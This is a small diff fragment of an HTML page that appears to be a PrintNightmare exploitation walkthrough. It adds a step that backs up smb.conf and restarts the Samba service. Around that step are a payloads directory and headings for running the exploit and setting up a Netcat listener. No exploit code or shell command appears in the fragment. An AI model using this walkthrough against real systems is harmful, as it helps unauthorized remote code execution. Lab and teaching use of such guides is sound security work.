@@ -1261,6 +1261,9 @@ sudo chmod -R 470 /home/user/Documents/printnightmare/payloads/
 <p>Restart the smbd service</p>
 <pre><code class=language-bash>sudo service smbd restart
 </code></pre>
+<pre><code class=language-bash>sudo cp /etc/samba/smb.conf etc/samba/smb.conf.bak
+sudo service smbd restart
+</code></pre>
 <h4 id=run-the-exploit>Run the Exploit</h4>
 <p>Setup a listner</p>
 <h5 id=netcat>Netcat</h5>
